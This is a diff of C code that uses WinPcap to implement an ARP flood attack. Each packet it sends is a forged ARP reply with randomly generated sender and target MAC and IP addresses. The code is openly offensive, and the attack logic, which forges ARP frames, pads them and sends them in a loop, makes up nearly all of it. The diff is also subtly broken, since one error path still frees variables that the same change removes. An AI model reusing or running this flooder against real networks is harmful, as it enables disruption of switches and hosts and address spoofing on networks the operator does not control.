@@ -59,16 +59,10 @@ void buildArpHeader(struct arp_hdr *arp_header, unsigned char *sender_mac, unsig
     (*arp_header).plen = ARP_PROTO_SIZE;
     (*arp_header).oper = htons(ARP_REPLY); // 2
     // memcpy or memset depending on the pointer
-    memcpy((*arp_header).sha, sender_mac != NULL ? sender_mac : memset(&((*arp_header).sha), 0, ETHER_ADDR_LEN),
-           ETHER_ADDR_LEN);
-    memcpy((*arp_header).spa, sender_ip != NULL ? sender_ip : memset(&((*arp_header).spa), 0, IP_ADDR_LEN),
-           IP_ADDR_LEN);
-    /*
-     * Reserved in case decomposition is needed, but since the target MAC and target IP are generally generated consistently,
-     * it is preferable to do this without repeating the filling process each time, but rather separately record only them
-     */
-    //memcpy((*arp_header).tha, target_mac != NULL ? target_mac : memset(&((*arp_header).tha), 0, ETHER_ADDR_LEN), ETHER_ADDR_LEN);
-    //memcpy((*arp_header).tpa, target_ip != NULL ? target_ip : memset(&((*arp_header).tpa), 0, IP_ADDR_LEN), IP_ADDR_LEN);
+    memcpy((*arp_header).sha, sender_mac != NULL ? sender_mac : memset(&((*arp_header).sha), 0, ETHER_ADDR_LEN), ETHER_ADDR_LEN);
+    memcpy((*arp_header).spa, sender_ip != NULL ? sender_ip : memset(&((*arp_header).spa), 0, IP_ADDR_LEN), IP_ADDR_LEN);
+    memcpy((*arp_header).tha, target_mac != NULL ? target_mac : memset(&((*arp_header).tha), 0, ETHER_ADDR_LEN), ETHER_ADDR_LEN);
+    memcpy((*arp_header).tpa, target_ip != NULL ? target_ip : memset(&((*arp_header).tpa), 0, IP_ADDR_LEN), IP_ADDR_LEN);
 }
 
 // 0 - success, 1 - error
@@ -81,29 +75,27 @@ int sendPacketViaWinPcap(pcap_t *handle, unsigned char *packet, int packet_size)
 }
 
 // You can change it by adding src_ip, but in this case I decided to make src_ip unknown for greater security
-void performArpFloodAttack(pcap_if_t *dev, unsigned char *src_mac, unsigned char *src_ip, int num_packets_to_send) {
+void performArpFloodAttack(pcap_if_t *dev, int num_packets_to_send) {
     if (num_packets_to_send <= 0) {
         return;
     }
     struct ether_hdr ether_header;
     struct arp_hdr arp_header;
-    unsigned char broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    // prepare base part of ARP packet
-    buildEthernetHeader(&ether_header, src_mac, broadcast_mac);
-    buildArpHeader(&arp_header, src_mac, NULL, NULL, NULL);
-    // check the "fill_arp_hdr" function to understand
-    unsigned char *dst_mac = malloc(6 * sizeof(unsigned char));
-    unsigned char *dst_ip = malloc(4 * sizeof(unsigned char));
+    unsigned char *sender_mac = malloc(6 * sizeof(unsigned char));
+    unsigned char *sender_ip = malloc(4 * sizeof(unsigned char));
+    unsigned char *target_mac = malloc(6 * sizeof(unsigned char));
+    unsigned char *target_ip = malloc(4 * sizeof(unsigned char));
     int packet_size = sizeof(ether_header) + sizeof(arp_header);
     unsigned char packet[packet_size];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle = pcap_open_live(dev->name, BUFSIZ, 0, 1000, errbuf);
     for (int i = 1; i <= num_packets_to_send; i++) {
-        generateRandomMAC(dst_mac);
-        generateRandomIPv4(dst_ip);
-
-        memcpy(arp_header.tha, dst_mac, ETHER_ADDR_LEN);
-        memcpy(arp_header.tpa, dst_ip, IP_ADDR_LEN);
+        generateRandomMAC(sender_mac);
+        generateRandomIPv4(sender_ip);
+        generateRandomMAC(target_mac);
+        generateRandomIPv4(target_ip);
+        buildEthernetHeader(&ether_header, sender_mac, target_mac);
+        buildArpHeader(&arp_header, sender_mac, sender_ip, target_mac, target_ip);
 
         memcpy(packet, &ether_header, sizeof(ether_header));
         memcpy(packet + sizeof(ether_header), &arp_header, sizeof(arp_header));
@@ -112,11 +104,18 @@ void performArpFloodAttack(pcap_if_t *dev, unsigned char *src_mac, unsigned char
         int padding_size = FRAME_SIZE_TO_SEND - packet_size;
         memset(packet + packet_size, 0, padding_size); // 60 bytes
         packet_size = FRAME_SIZE_TO_SEND;
-
+        /*
+        // Optional
+        printf("-> Sender MAC: %02X.%02X.%02X.%02X.%02X.%02X\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
+        printf("-> Sender IP: %u.%u.%u.%u\n", sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
+        printf(">- Target MAC: %02X.%02X.%02X.%02X.%02X.%02X\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
+        printf(">- Target IP: %u.%u.%u.%u\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
+        */
         printHexDump(packet, packet_size);
-
-        //sending
-        if (sendPacketViaWinPcap(handle, packet, packet_size) == FAILURE_SEND) {
+        /*
+        // WARNING: WI-FI does not allow sending packets with a MAC address that does not match the MAC address of the adapter
+        */
+         if (sendPacketViaWinPcap(handle, packet, packet_size) == FAILURE_SEND) {
             pcap_close(handle);
             free(dst_mac);
             free(dst_ip);
@@ -125,6 +124,8 @@ void performArpFloodAttack(pcap_if_t *dev, unsigned char *src_mac, unsigned char
         printf("^Packet %d sent successfully!\n", i);
     }
     pcap_close(handle);
-    free(dst_mac);
-    free(dst_ip);
+    free(sender_mac);
+    free(sender_ip);
+    free(target_mac);
+    free(target_ip);
 }
